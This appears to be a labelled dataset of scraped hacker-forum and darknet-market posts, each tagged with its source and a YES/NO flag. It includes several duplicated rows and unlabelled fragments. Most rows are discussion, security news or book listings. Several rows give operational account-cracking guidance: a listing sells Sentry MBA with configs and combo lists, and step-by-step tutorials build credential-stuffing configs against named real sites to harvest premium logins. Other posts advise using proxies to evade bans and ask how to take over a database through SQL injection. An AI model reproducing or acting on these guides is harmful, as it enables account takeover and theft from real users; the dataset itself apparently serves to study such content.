"Technitium Mac Changer Technitium MAC Address Changer allows you to change (spoof) Media Access Control (MAC) Address of your Network Interface Card (NIC) instantly. It has a very simple user interface and provides ample information regarding each NIC in the machine. Every NIC has a MAC address hard coded in its circuit by the manufacturer. This hard coded MAC address is used by windows drivers to access Ethernet Network (LAN). This tool can set a new MAC address to your NIC, bypassing the original hard coded MAC address. Technitium MAC Address Changer is a must tool in every security professionals tool box.<br><br><br>Features<br>Works on Windows 7 & 8 for both 32-bit and 64-bit.<br>Enhanced network configuration presets with IPv6 support allow you to quickly switch between network configurations.<br>Allows complete configuration of any network adapter.<br>Command line options with entire software functionality available. You can select a preset from specified preset file to apply directly.<br>Update network card vendors list feature allows you to download latest vendor data (OUI) from IEEE.org.<br><br><br>How Does It Work?<br><br>This software just writes a value into the windows registry.

If a value is present, windows will use it as MAC address, if not, windows will use the hard coded manufacturer provided MAC address. Some Network Adapter drivers have this facility built-in. It can be found in the Advance settings tab in the Network Adapter's Device properties in Windows Device Manager.<br><br><br>How To Change MAC Address<br>1.Starting MAC address changer will list all available network adapters.<br>2.Select the adapter you want to change the MAC address.

"Sentry MBA 1.4.1 account cracker Credentials stuffing attack technique became a very popular way nowadays to brute force user accounts over web applications login pages. Instead of trying to guess a certain user password from a generated word list (a.k.a. dictionary), attackers reuse credentials leaked from other websites. The attack exploits the fact that people usually use the same user name and password on many different websites. Those attacks are executed using special tools tailored for this scenario, called by the hackers Combo Checkers, such as Sentry MBA.  <br><br>+ 1000 configs<br>+ combo list collection <br>",D3DreamMarket,YES

"  Hello guys,  recently I was working on some poc code when I came across this interesting feature. So I wanted to share with you.  When you want to add some text dynamically to any element, following two ways I know works.  Example 1: Use of document.innerHTML   Code: Dynamic Text Addition example First line of paragraph.  add another text This code is vulnerable to XSS. document.innerHTML() doesn\'t sanitize the string. Replace ""Hey Hi dude!"" with """" and Test.  Example 2: Use of document.createTextNode()   Code: createTextNode example First line of paragraph.  add another textNode. Example taken from https://developer.mozilla.org/en/DOM...createTextNode  document.createTextNode() by default encode the malicious characters responsible for XSS. Replace "" Some text added dynamically. "" with """" and Test.  It is recommended to use document.createTextNode() instead of document.innerHTML to prevent XSS.  Hope you like this. Please comment this thread if you have any queries.  Cheers, AMol NAik",D4Garage4hackers,YES

Use an array of free web services (www.tmto.com anyone?) to get the hash.

"Ok so you have your wordlist and proxylist and you want to try it out. In this tutorial I will show you how to crack basic pop-up sites with Sentry MBA and make your config. Site for example is prettypetites.com Now open site and search for ""members"" right click and ""Copy Link Location"": You do not have sufficient rights to see the hidden data contained here. and paste it in sentry You do not have sufficient rights to see the hidden data contained here. Click on ""HTTP Header"" tab: site is pop-up so we will use GET method You do not have sufficient rights to see the hidden data contained here. ""Proxy Settings"" tab - just leave it as it is, click on the next tab ""Fake Settings"" and make sure you ticked ""Follow Redirects"": You do not have sufficient rights to see the hidden data contained here. Now you need to find Failure Key: Go to site and click on ""members"", than click cancel, right click and ""View Page Source"" You do not have sufficient rights to see the hidden data contained here. now copy You do not have sufficient rights to see the hidden data contained here. this you will use as your source failure key You do not have sufficient rights to see the hidden data contained here.

You do not have sufficient rights to see the hidden data contained here. We are ready now so click on ""Progression"" tab and hit ""Start"" You do not have sufficient rights to see the hidden data contained here. Now just click on ""To Check"" tab and wait until u get something, once you do right click on it and ""View Source Answer in Browser"" You do not have sufficient rights to see the hidden data contained here. Ok now this looks like a hit You do not have sufficient rights to see the hidden data contained here. You now need to find ""Success Key"" from the page source and it needs to be something that will appear only on that page and not on members login page: select it right click and ""View Selection Source"" You do not have sufficient rights to see the hidden data contained here. copy You do not have sufficient rights to see the hidden data contained here. and as long as we can't find it in here it's valid You do not have sufficient rights to see the hidden data contained here. so you can add it to Success Keys - same as you did with failure key You do not have sufficient rights to see the hidden data contained here. After adding it under ""Update Bruteforcer Key"" click ""Update"" You finished your config and now all valid logins will appear in ""Hits"" You do not have sufficient rights to see the hidden data contained here.

"  In computer security, heap spraying is a technique used in exploits to facilitate arbitrary code execution.The term is also used to describe the part of the source code of an exploit that implements this technique. In general, code that sprays the heap attempts to put a certain sequence of bytes at a predetermined location in the memory of a target process by having it allocate (large) blocks on the process\' heap and fill the bytes in these blocks with the right values. They commonly take advantage from the fact that these heap blocks will roughly be in the same location every time the heap spray is run. Execution flow can be redirected to the heap sprays via buffer overflow or heap overflow flaws.  Heap spray was widely used by chinese hackers while attacking google and various embassies of different countries. Earlier ""vinnu"" bro had explained about heap spray. Long time ago, I got a good tutorial from the internet over heap spray. So I thought of sharing it with all people. It will give beginners a very good approach towards heap spray and its implementation. The tutorial is bit long, so no chance of posting it here. I m just gonna share the link of the blog. Its a blog of an info-sec guy. A good one So enjoy guys. Feedbacks and comments are appreciated  http://grey-corner.blogspot.com/2010...-internet.html",D4Garage4hackers,YES

"Hacking a website not only means taking the whole control of website but can be either changing the website datas or make the website down by making denial of serviceattack.Here in this article we will see some possible ways of attacking a website.A website can be attacked in any one of the following ways. Password Cracking Simple SQL Injection Hack Brute force attack for servers Denial of service PASSWORD CRACKING The first and foremost thing that every hacker must need to hack a website is the hostingIP address of the website.You can directly find the IP address of any website from yourcommand prompt itself. 1. For that open command prompt (window + r) and type cmd and hit enter. 2. Type the following command followed by the URL of the website nslookup URL addressFor example nslookup www.realhackings.comand hit enter.you can see a window as shown below with the ip address of the website Now you have got the IP address of the website.next step is to scan the IP we have got just now to see which protocols the Website at this IP is using For scanninng DOWNLOAD IP scanner and open it you can see a window as shown below.Just paste the IP you have just got and click scan button. In the above image FTP is shown,That means this website is using FTP to access to its servers.just double click on the FTP to see a window as shown below Now this is the final stage.When you enter exact username and password you can login to that website and do whatever you like.To find this username and password we have to dobrute force attack BRUTE FORCE ATTACK In cryptanalysis, a brute force attack is a method of defeating a cryptographic scheme by trying a large number of possibilities; for example, exhaustively working through all possible keys in order to decrypt a message.Well, to put it in simple words, brute-force attack guess a password by trying all probable variants by given character set. Eg. checking all combination in lower Latin character set, that is 'abcdefghijklmnopqrstuvwxyz'. Brute-force attack is very slow. For example, once you set lower Latin charset for your brute-force attack, you'll have to look through 217 180 147 158 variants for 1-8 symbol password. It must be used only if other attacks have failed to recover your password.For attacking any account using this technique you should need high patience and it will take a lot of time depending upon the number of characters Denial of service ( Ddos attack ): A denial of service attack (DOS) is an attack through which a person can render a system unusable or significantly slow down the system for legitimate users by overloading the resources, so that no one can access it.this is not actually hacking a webite but it is used to take down a website. If an attacker is unable to gain access to a machine, the attacker most probably will just crash the machine to accomplish a denial of service attack,this one of the most used method for website hacking SQL INJECTION SQL injection is a vulnerability that allows an attacker to influence the queries that are passed to the back-end database.It has been present since the time databases have been attached to the web applications.Before understanding the how SQL injection attacks we need to understand the Simple Three Tier Architecture or a Four Tier Architecture.This will clear your basics and give you a rough idea of how database-driven web applicationswork. NOTE: This is only for the website owners to test their websites for different vulnerabilities and to enable maximum security.",D2CrackingFire,YES

"  ClickJacking is a little bit difficult to explain however try to imagine any button that you see in your browser from the Wire Transfer Button on your Bank, Post Blog button on your blog, Add user button on your web-site, Google Gadgets etc. ClickJacking gives the attacker to ability to invisibly float these buttons on-top of other innocent looking objects in your browser.  So when you try to click on the innocent object, you are actually clicking on the malicious button that is floating on top invisibly.  In other words, the attack is thrown by a malicious web page embedding objects, possibly from a different site, such as framed documents or plugin content (Flash, Silverlight, JavaÂ) which may lead to unwanted results if clicked by the current user (e.g. a ÂDelete all messagesÂ button in your webmail or an advertisement banner in a click fraud scheme). Using DHTML, and especially CSS, the attacker can disguise or hide the click target in several ways which go completely undetected by the user, whoÂs easily tricked into clicking it in a more or less blind way.  JavaScript increases the effectiveness of these attacks hugely, because it can make our invisible target constantly follow the mouse pointer, intercepting userÂs first click with no failure.  We can however imagine a few less effective but still feasible scriptless scenarios, e.g. covering the whole window with hidden duplicates of the target or overlaying an attractive element of the page, likely to be clicked (e.g. a game or a porn image link), with a transparent target instance.

No prior experience is needed. Web apps are a ""path of least resistance"" that can be exploited to cause the most damage to a system, with the lowest hurdles to overcome. This is a perfect storm for beginning hackers. The process set forth in this book introduces not only the theory and practical information related to these vulnerabilities, but also the detailed configuration and usage of widely available tools necessary to exploit these vulnerabilities.<br><br>The Basics of Web Hacking provides a simple and clean explanation of how to utilize tools such as Burp Suite, sqlmap, and Zed Attack Proxy (ZAP), as well as basic network scanning tools such as nmap, Nikto, Nessus, Metasploit, John the Ripper, web shells, netcat, and more. Dr. Josh Pauli teaches software security at Dakota State University and has presented on this topic to the U.S. Department of Homeland Security, the NSA, BlackHat Briefings, and Defcon. He will lead you through a focused, three-part approach to Web security, including hacking the server, hacking the Web app, and hacking the Web user.<br><br>With Dr. Paulis approach, you will fully understand the what/where/why/how of the most widespread Web vulnerabilities and how easily they can be exploited with the correct tools. You will learn how to set up a safe environment to conduct these attacks, including an attacker Virtual Machine (VM) with all necessary tools and several known-vulnerable Web application VMs that are widely available and maintained for this very purpose. Once you complete the entire process, not only will you be prepared to test for the most damaging Web exploits, you will also be prepared to conduct more advanced Web hacks that mandate a strong base of knowledge.<br><br>Provides a simple and clean approach to Web hacking, including hands-on examples and exercises that are designed to teach you how to hack the server, hack the Web app, and hack the Web user<br>Covers the most significant new tools such as nmap, Nikto, Nessus, Metasploit, John the Ripper, web shells, netcat, and more!<br>Written by an author who works in the field as a penetration tester and who teaches Web security classes at Dakota State University <br><br>If you like to know more about it please buy this book<br><br>Mobi Reader: Free<br><br><br>i will send my all  order within 1 day, if you have any issue about this order you will message me i will sort it out ASAPIf you like to know more about it please buy this book<br><br>Mobi Reader: Free<br><br><br>i will send my all  order within 1 day, if you have any issue about this order you will message me i will sort it out ASAP <br>",D3DreamMarket,YES

"  Pen-testing/Vulnerability assessment is a mixture of what so called, ""Black-box testing"" and ""White-box testing"". Any company/organization follow some sort of protocol for standards, the intentions are like, ""get it, do it"" but the sole intention is to complete the project and get the revenue generated. In an application testing from developers/vendor point of view, its solely depends on a ""Black-box analogy"" as they are not much concern about the end-users gullibility, there actual concern is to see that the parts of the application exposed are working correctly. But, from a pen-testers view, the analogy simply changes to other end.  Methodology is just a starting process according to me, because, it solely depends upon the scenario we are about to face, consider a Network Security Assessment, we need to analyze needs for example, couple of years back I wrote an article on Network Security Consideration. when you have considerations in mind, you approach to figure out the security consequences you are about to face for your vulnerability assessments, as it solely depends upon the Organizations/Company\'s infrastructure you are dealing with, methodology is similar to a simple program/diagnosis network issue, like,  Its just the process of approach towards a problem. Most importantly the methodology is in place to over come the issues faced on-site vulnerability like, Enterprise Security auditing in place, or Enterprise Network Security Assessments, where as pen-tester, you just cannot follow your methodology and fuck up the network which in turn which effects the Revenue generation process which may get into trouble.

"Hi there, i am new here at Cracking Area. I looking for some kind of professional support to hack an encrypted file. This is not a illegal taks or else, it is a customer requerst, who lost their master password. Backgroud: We have a backup which should be encryptet by a GPG key pair, but when it comes to the disaster and we try to recover the archive, we got caught by surprise when the gpg utility ask not for the private key passphrase, but for the symmetrical encryption passphrase. This passphrase is not known. We found some directoy listings and a probable file which contains the key. We see the key file is 13 bytes in size. This leads us to guess a key lenght of 11 to 13 chars (dont know if there may be a CR or LF at the end). The encryption algorithm is (thanks to the gpg hint) 3DES. We have also 3 encrypted files which contains each just an empty tar.gz archive. These files are just a few bytes in size. I don't know if it may helpfull to get a very small probe file. What we looking for: Someone or some company who may help us with to recover the password. Are professionals out there. Or hints for some software/hardware setup to run a bruteforce against this gpg archive? Thank you Jens:wq sorry for my bad english",D1CrackingArena,YES

"       XSS based SQLi attack interesting it sounds <br> <br>use cases i can think of where applications have SQLi bug in code but only for admin and a XSS attack is available on a normal page or post of thread. <br> <br>so if someone launches XSS towards admin and admin fell for it then SQLi could be possible. (XSS need not be on same site.) <br> <br>another use-case which i thing would be very generiic is if you have a SQLi you can inject XSS strings directly in DB which could be displayed on webpage directly from DB.    <br>you mentioned a nice point <br> <br>Assume like this if the admin owns a high profile site and if the attacker wants to pwn the admin,even he can set up a xss vulnerable forum and post a attractive thread in his forum and ask him to take a look and pwn him,so i think you mentioned a pretty good point <br> <br>Also i would like to learn some thing by asking some questions,so bear with me and my question <br> <br>In some cases i had seen in my real life where i don\'t have the privileges to add INSERT , UPDATE commands in the DB. <br> <br>I only have the privileges read things stored in the db,And to my little knowledge most secured sites storing the db passwords (always complex with name,numbers and special symbols) in salted hashes and also they run the db servers with least privileges etc... <br> <br>beyond cracking the salted hashes(which is time consuming),how can i overcome these difficulties and what are all the other things I can do to own the database ?",D4Garage4hackers,YES

"Born in Blood The Lost Secrets of Freemasonry 1989 Its mysterious symbols and rituals had been used in secret for centuries before Freemasonry revealed itself in London in 1717. Once known, Freemasonry spread throughout the world and attracted kings, emperors, and statesmen to take its sacred oaths. It also attracted great revolutionaries such as George Washington and Sam Houston in America, Juarez in Mexico, Garibaldi in Italy, and Bolivar in South America. It was outlawed over the centuries by Hitler, Mussolini, and the Ayatollah Khomeini. But where had this powerful organization come from? What was it doing in those secret centuries before it rose from underground more than 270 years ago? And why was Freemasonry attacked with such intense hatred by the Roman Catholic church?<br><br>This amazing detective story answers those questions and proves that the Knights Templar in Britain, fleeing arrest and torture by pope and king, formed a secret society of mutual protection that came to be called Freemasonry. Based on years of meticulous research, this book solves the last remaining mysteries of the Masons - their secret words, symbols, and allegories whose true meanings had been lost in antiquity. With a richly drawn background of the bloody battles, the opportunistic kings and scheming popes, the tortures and religious persecution throughout the Middle Ages, it is an important book that may require that we take a new look at the history of events leading to the Protestant Reformation.<br><br>Format: PDF <br>",D3DreamMarket,NO

"  Hello all, it recently came to my attention a command injection exploitation tool, which has the name commix ( 1 ) and by using it, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string.  Commix seems to be a great command injection tool which successfully exploits many vulnerable applications such as DVWA, bWAPP, ShelLOL, Persistence, Kioptrix(2014), w3af-moth etc.  I found references on that tool in many sites, like TrustedSec\'s Security Podcast Episode 6 ( 2 ) softpedia ( 3 ) and packetstormsecurity ( 4 ) and darknet.org.uk ( 5 ). As I noted recently it has been added to trustedsec\'s Penetration Testers Framework (PTF) ( 6 ). In the official github page ( 1 ), several exploitation examples ( 7 ), demos ( 8 ) and examples of combinatorial use of commix with other tools ( 9 ) (i.e metasploit and weevely) are posted .  ps: I\'ve already requested on BackBox Linux forum ( 10 )  ( 1 ) https://github.com/stasinopoulos/commix ( 2 ) https:../www.trustedsec.com/may-2015/...-6-show-notes/default.htm ( 3 ) http://news.softpedia.com/news/Commi...s-477728.shtml ( 4 ) http://packetstormsecurity.com/files...tion-Tool.html ( 5 ) http://www.darknet.org.uk/2015/04/co...n-attack-tool/ ( 6 ) https://github.com/trustedsec/ptf ( 7 ) https://github.com/stasinopoulos/com...Usage-Examples ( 8 ) https:../www.youtube.com/channel/UCFG...jdvyIiSy0mPI4A ( 9 ) https://github.com/stasinopoulos/com.../Upload-shells ( 10 ) https:../forum.backbox.org/tool-reque...oitation-tool/default.htm",D4Garage4hackers,YES

"Anonymous SMS on TOR  i'll tell you where to get mobile phone numbers, using Bitcoin and TOR, completely anonymously.<br>They don't even take an email address if you don't want to supply one. You can send and receive SMS text messages on these anonymous numbers using theyr .onion web interface. <br>Many  numbers can receive voice calls as voicemail messages, and we also provide physical numbers so that messages can not be filtered by the upstream virtual number provider. <br><br>We use an SMS API service to buy the virtual numbers and to send and receive the messages. This means we are able to offer numbers in a wide range of countries without needing any physical presence in those countries. The downside of using an API provider, instead of operating physical phones, is that the API provider can see all the messages. And, more importantly, our API provider blocks the messages that are involved for signing up to some online services.

"ContamiNation My Quest to Survive in a Toxic World An investigation into the dangers of the chemicals present in our daily lives, along with practical advice for reducing these toxins in our bodies and homes, from acclaimed journalist McKay Jenkins.<br> <br>A few years ago, journalism professor McKay Jenkins went in for a routine medical exam. What doctors found was not routine at all: a tumor, the size of a navel orange, was lurking in his abdomen. When Jenkins returned to the hospital to have the tumor removed, he was visited by a couple of researchers with clipboards. They had some questions for him. Odd questions. How much exposure had he had to toxic chemicals and other contaminants? Asbestos dust? Vinyl chlorine? Pesticides? A million questions, all about seemingly obscure chemicals. Jenkins, an exercise nut and an enviro-conscious, organic-garden kind of guy, suddenly realized hed spent his life marinating in toxic stuff, from his wall-to-wall carpeting, to his dryer sheets, to his drinking water. And from the moment he left the hospital, he resolved to discover the truth about chemicals and the healthy levels of exposure we encounter each day as Americans.<br> <br>Jenkins spent the next two years digging, exploring five frontiers of toxic exposurethe body, the home, the drinking water, the lawn, and the local box storeand asking how we allowed ourselves to get to this point. He soon learned that the giants of the chemical industry operate virtually unchecked, and a parent has almost no way of finding out what the toy her child is putting in his or her mouth is made of. Most important, though, Jenkins wanted to know what we can do to turn things around. Though toxins may be present in products we all use every dayfrom ant spray, perfume, and grass seed to shower curtains and, yes, baby shampoothere are ways to lessen our exposure. ContamiNation is an eye-opening report from the front lines of consumer advocacy.<br><br>Format: PDF <br>",D3DreamMarket,NO

"Hey Anon, Definition: Cracking is a series of brute force attacks on the target. It consists of systematically checking all possible keys or passwords until the correct one is found. First I would like to say that it all depends on what you are cracking. I would not go in the detail on which sites, I am sure you know what I mean (If you don't then send me a private message). The sites that are cracked here involves almost no risk because proxies are used to crack most of the sites. If you have good proxies then you should be fine. One bad thing the you might frequently run in while starting cracker as a beginners is that you might get your IP temporarily banned on the sites you are trying to crack. I recommend doing research and watching/reading tutorials (There are lot out there) before beginning to crack. Hope I helped you understand the basic concept of cracking. All the best in the future.

"  Sounds bit different, but yes, hackers can blow your Apple laptop using its battery. According to security researcher Charlie Miller of Accuvant, AppleÂs Macbook batteries can be hacked to cause fires or used to plant malware. He will be demonstaring the hack at the Black Hat security conference which is going to be held next month in Las Vegas. The demonstration will be showing how to hack into and control a batteryÂs microprocessor  Charlie Miller told Forbes News that ÂThese batteries just arenÂt designed with the idea that people will mess with them. What IÂm showing is that itÂs possible to use them to do something really bad.Â If the controller for the battery has been compromised it can be manipulated to the point where the battery is dead i.e. bricked. It might be possible to cause a fire or explosion by placing malware on the chip, although Miller hasnÂt put up these idea so far. Well, the demonstration next month will be interesting to watch. This research has shown the potential of hacking in any form. It will be interesting to see whether other batteries and laptops resemble the same vulnerability.  Source",D4Garage4hackers,YES

"Hacking a website not only means taking the whole control of website but can be either changing the website datas or make the website down by making denial of serviceattack.Here in this article we will see some possible ways of attacking a website.A website can be attacked in any one of the following ways. Password Cracking Simple SQL Injection Hack Brute force attack for servers Denial of service PASSWORD CRACKING The first and foremost thing that every hacker must need to hack a website is the hostingIP address of the website.You can directly find the IP address of any website from yourcommand prompt itself. 1. For that open command prompt (window + r) and type cmd and hit enter. 2. Type the following command followed by the URL of the website nslookup URL addressFor example nslookup www.realhackings.comand hit enter.you can see a window as shown below with the ip address of the website Now you have got the IP address of the website.next step is to scan the IP we have got just now to see which protocols the Website at this IP is using For scanninng DOWNLOAD IP scanner and open it you can see a window as shown below.Just paste the IP you have just got and click scan button. In the above image FTP is shown,That means this website is using FTP to access to its servers.just double click on the FTP to see a window as shown below Now this is the final stage.When you enter exact username and password you can login to that website and do whatever you like.To find this username and password we have to dobrute force attack BRUTE FORCE ATTACK In cryptanalysis, a brute force attack is a method of defeating a cryptographic scheme by trying a large number of possibilities; for example, exhaustively working through all possible keys in order to decrypt a message.Well, to put it in simple words, brute-force attack guess a password by trying all probable variants by given character set. Eg. checking all combination in lower Latin character set, that is 'abcdefghijklmnopqrstuvwxyz'. Brute-force attack is very slow. For example, once you set lower Latin charset for your brute-force attack, you'll have to look through 217 180 147 158 variants for 1-8 symbol password. It must be used only if other attacks have failed to recover your password.For attacking any account using this technique you should need high patience and it will take a lot of time depending upon the number of characters Denial of service ( Ddos attack ): A denial of service attack (DOS) is an attack through which a person can render a system unusable or significantly slow down the system for legitimate users by overloading the resources, so that no one can access it.this is not actually hacking a webite but it is used to take down a website. If an attacker is unable to gain access to a machine, the attacker most probably will just crash the machine to accomplish a denial of service attack,this one of the most used method for website hacking SQL INJECTION SQL injection is a vulnerability that allows an attacker to influence the queries that are passed to the back-end database.It has been present since the time databases have been attached to the web applications.Before understanding the how SQL injection attacks we need to understand the Simple Three Tier Architecture or a Four Tier Architecture.This will clear your basics and give you a rough idea of how database-driven web applicationswork. NOTE: This is only for the website owners to test their websites for different vulnerabilities and to enable maximum security.",D2CrackingFire,YES

But despite the hype, Tyrannosaurus and the other tyrannosaurs are fascinating animals in their own right, and are among the best-studied of all dinosaurs.<br><br>Tyrannosaurs started small, but over the course of 100 million years evolved into the giant carnivorous bone-crushers that continue to inspire awe in palaeontologists, screenplay writers, sci-fi novelists and the general public alike. Tyrannosaurus itself was truly impressive; it topped six tons, was more than 12m (40 feet) long, and had the largest head and most powerful bite of any land animal in history.<br><br>The Tyrannosaur Chronicles tracks the rise of these dinosaurs, and presents the latest research into their biology, showing off more than just their impressive statistics - tyrannosaurs had feathers and fought and even ate each other.

"A remote Microsoft FTP server exploit was released today by Kingcope, and can be found at http://milw0rm.com/exploits/9541, A quick examination of the exploit showed some fancy manipulations in a highly restrictive environment that lead to aâuseraddâ type payload. The main issue was the relatively small payload size allowed by the SITE command, which was limited to around 500 bytes. After a bit of tinkering around, we saw that the PASSWORD field would be most suitable to shove a larger payload (bindshell). A quick replacement of the original âuser addâ shellcode with a secondary encoded egghunter â and a bind shell was presented to us!

"This is an unofficial sneak peak i still didnt fix all the buttons for the combos tab (they will change more, i will make some of them big again) basically its incomplete but its for you guys to see some differences it will work though (i think, i havent tested but no reason why it shouldnt work. but some buttons might not do their job right) Alot of things wont work. The tab on user\var mods under combos im going to remove it (it's going to be a much easier dialogue, no tab) Give me feedback if it crashes somehow or somewhere please. here is the incomplete changelog Code: -Reduced startup load time in half (from 4.1seconds to 2.2seconds). -Changed the UI alot. Put icons on all the buttons. Updated some but not all tooltips yet. -Changed the way combolist loading works *Dialogs ~ *Skin is now disabled by default (but you can still change that from settings) *No longer loading\unloading pool. You just check the lists you want to use. *Descriptions of most buttons are in the tooltips *Alot of you like to go to a position in their list. You can't exactly ""JUMP"" to a position anymore BUT you can use the SPLIT function which will be the SAME as going to a specific position. e.g. You have a 10000 combolist, you right click it and press ""SPLIT"" and you chose by position and you set the position to 3000(for example). Then 2 lists will show with the same name but with part 1 (3000 combos count) and part 2 (7000 combos count). You can check part 2 and uncheck part 1, and it would be the same as bruteforcing from that position in the original list. *You can press apply combo changes if you want to see the correct numbers without pressing start etc... ~When the session is ""Not Ready"" it means the values you see are estimates (not 100% correct) and don't count the combo settings yet ~When the session is ""Ready"" it means these are the final values after applying combo settings (like history, or mods and filters, etc...) ~You don't need to press apply combo changes before you start. It will apply on its own when needed. ~RESULT = FASTER: When you have big lists and you change mods or change profile many times before starting, the changes don't have to apply each time you make a change. ~Basically the point is to make Account Hitman alot faster and alot less memory consuming. ~I REPEAT: YOU DON'T NEED TO PRESS ""APPLY COMBO CHANGES"" EVER. IT IS ONLY FOR THE RIGHT NUMBERS TO SHOW. YOUR SETTINGS WILL TAKE EFFECT ON THEIR OWN WHEN YOU START BRUTEFORCING EVEN IF YOU DON'T PRESS APPLY. If you do press it, then you press start, it is the SAME as pressing start without pressing it! -New settings under profile settings--extra settings. Read the tooltips! -Added balloon tips (and later will add sounds) for when: *When you get a hit *When bruteforcing finishes *When bruteforcing stops but the user did not press stop *You can disable balloon tips from the startup tab--General I have written more code that is still ""under the hood"" because the buttons for them are not created yet. I dont know how long it will take for a stable official release (tomorrow i will get my comp back, but i still have to study alot :\) I'm having a hard time picking a background color, maybe you can help because i'm starting to like gray Enjoy Give me feedback on the speed of loading\memory usage\CPU usage when bruteforcing\how the new combos add & load Try to load as big combolists as you want Let me know of any errors (you can now send me errorlog.txt btw!)

By leveraging this issue, an attacker may be able to cause arbitrary HTML to be executed in a user\'s browser within the security context of the affected site.  The remote web server may be vulnerable to IFRAME injections or cross-site scripting attacks :  - IFRAME injections allow \'virtual defacement\' that might scare or anger gullible users. Such injections are sometimes implemented for \'phishing\' attacks.  - XSS are extensively tested by four other scripts.

If you can afford go for SANS GPEN, its costly but certification from SANS usually has good industry recognition. Also Pentesting with Backtrack certification from offensive security is really nice one. It tests your practical ability to penetrate into the target.

"  Hello there.  I\'m digging into mshtml.dll & internet explorer for reverse engineering stuff. I\'m dissecting the ""CTitileElement"" class & my purpose is to dissect each CTititleElement function while manipulating ""Title"" tags . well, first of all, I created the following breakpoints while attaching to MS IE 11.0 with windbg .   Code: 0:022 bp MSHTML!CTitleElement::CreateElement0:022 bp MSHTML!CTitleElement::CreateElementIE90:022 bp MSHTML!CTitleElement::GetTitle0:022 bp MSHTML!CTitleElement::SetTitle0:022 bp MSHTML!CTitleElement::TitleLength Then I use the following simple javascript code :  Code:  Hello There! I want my debugger to hit @ creating the title element, but unfortunately it\'s quite unstable, I\'m not able to be trapped by the debugger while creating the ""Title"" tag on the above code.  I thought it is the problem of ASLR & my ""br"" command (since it\'s creating the breakpoint @ the spcified address) & I disabled the ASLR by installing EMET & disabling all protections, but still I\'m unsucessful.  Any suggestion to solve this issue ? Thanks!  Regards. ~ Area51",D4Garage4hackers,NO

"Hey Anon, Definition: Cracking is a series of brute force attacks on the target. It consists of systematically checking all possible keys or passwords until the correct one is found. First I would like to say that it all depends on what you are cracking. I would not go in the detail on which sites, I am sure you know what I mean (If you don't then send me a private message). The sites that are cracked here involves almost no risk because proxies are used to crack most of the sites. If you have good proxies then you should be fine. One bad thing the you might frequently run in while starting cracker as a beginners is that you might get your IP temporarily banned on the sites you are trying to crack. I recommend doing research and watching/reading tutorials (There are lot out there) before beginning to crack. Hope I helped you understand the basic concept of cracking. All the best in the future.

"  On Sunday, the 28th of November 2010 around 20:00 UTC the main <br>distribution server of the ProFTPD project was compromised. The <br>attackers most likely used an unpatched security issue in the FTP daemon <br>to gain access to the server and used their privileges to replace the <br>source files for ProFTPD 1.3.3c with a version which contained a backdoor. <br>The unauthorized modification of the source code was noticed by <br>Daniel Austin and relayed to the ProFTPD project by Jeroen Geilman on <br>Wednesday, December 1 and fixed shortly afterwards. <br> <br>The fact that the server acted as the main FTP site for the ProFTPD <br>project (ftp.proftpd.org) as well as the rsync distribution server <br>(rsync.proftpd.org) for all ProFTPD mirror servers means that anyone who <br>downloaded ProFTPD 1.3.3c from one of the official mirrors from 2010-11-28 <br>to 2010-12-02 will most likely be affected by the problem. <br> <br>The backdoor introduced by the attackers allows unauthenticated users <br>remote root access to systems which run the maliciously modified version <br>of the ProFTPD daemon. <br> <br>Run MD5 checksums to be on the safer side.",D4Garage4hackers,YES

"  Executive Overview:  Websense researchers have discovered the use of CVE-2014-0322 as early as January 20, 2014 - nearly 3 weeks before the previously known first date of the attacks  The attack may be targeting organizations associated with the French aerospace association, GIFAS  The CVE-2014-0322 exploit in this attack is hosted on a US server  We observed the malicious Shockwave Flash (Tope.swf SHA:910de05e0113c167ba3878f73c64d55e5a2aff9a) being uploaded to VirusTotal on January 20. This was presumably done by the attackers to confirm if antivirus had protection for the exploit. At the time there was zero detection. The exploit may use an in-memory attack with no file writes to avoid detection from antivirus products Early analysis indicates correlations between this attack and the DeputyDog and EphemeralHydra groups  For more information : http://community.websense.com/blogs/...anization.aspx",D4Garage4hackers,YES

Click on ""HTTP Header"" tab: site is pop-up so we will use GET method You do not have sufficient rights to see the hidden data contained here. ""Proxy Settings"" tab - just leave it as it is, click on the next tab ""Fake Settings"" and make sure you ticked ""Follow Redirects"": You do not have sufficient rights to see the hidden data contained here. Now you need to find Failure Key: Go to site and click on ""members"", than click cancel, right click and ""View Page Source"" You do not have sufficient rights to see the hidden data contained here. now copy You do not have sufficient rights to see the hidden data contained here. this you will use as your source failure key You do not have sufficient rights to see the hidden data contained here.

Now just click on ""To Check"" tab and wait until u get something, once you do right click on it and ""View Source Answer in Browser"" You do not have sufficient rights to see the hidden data contained here. Ok now this looks like a hit You do not have sufficient rights to see the hidden data contained here. You now need to find ""Success Key"" from the page source and it needs to be something that will appear only on that page and not on members login page: select it right click and ""View Selection Source"" You do not have sufficient rights to see the hidden data contained here. copy You do not have sufficient rights to see the hidden data contained here. and as long as we can't find it in here it's valid You do not have sufficient rights to see the hidden data contained here. so you can add it to Success Keys - same as you did with failure key You do not have sufficient rights to see the hidden data contained here.

Site will be novafile.com classic form site. Now go to site's members login page, type in random wrong username and password and click ""Login"", than copy you source failure key You do not have sufficient rights to see the hidden data contained here. and add it in sentry You do not have sufficient rights to see the hidden data contained here. This is form site so go to ""HTTP Header"" tab and tick MW or POST than click to configure it You do not have sufficient rights to see the hidden data contained here. Now in POST wizard click ""Analyze Login Page"" and click ""Use Data"" You do not have sufficient rights to see the hidden data contained here. Load proxies and wordlist and cracking can begin, ok now i got few links to check in my ""To Check"" tab. This one is obviously free account coz it offers you to buy premium You do not have sufficient rights to see the hidden data contained here. but this one offers you to extend so it seems to me that this is premium one You do not have sufficient rights to see the hidden data contained here. now you can use this as success key You do not have sufficient rights to see the hidden data contained here. you also want to capture date to see for each one when it expires so after a while go ahead and log in to one of the premium ones right click ""View Page Source"", sellect all and copy it. Now go to sentry and open POST Wizard again, find ""Keywords Capture Stage"", enable it and click to configure it You do not have sufficient rights to see the hidden data contained here. now paste premium account page source here and search for date You do not have sufficient rights to see the hidden data contained here. You can enter Field Name ""Date"" You do not have sufficient rights to see the hidden data contained here.

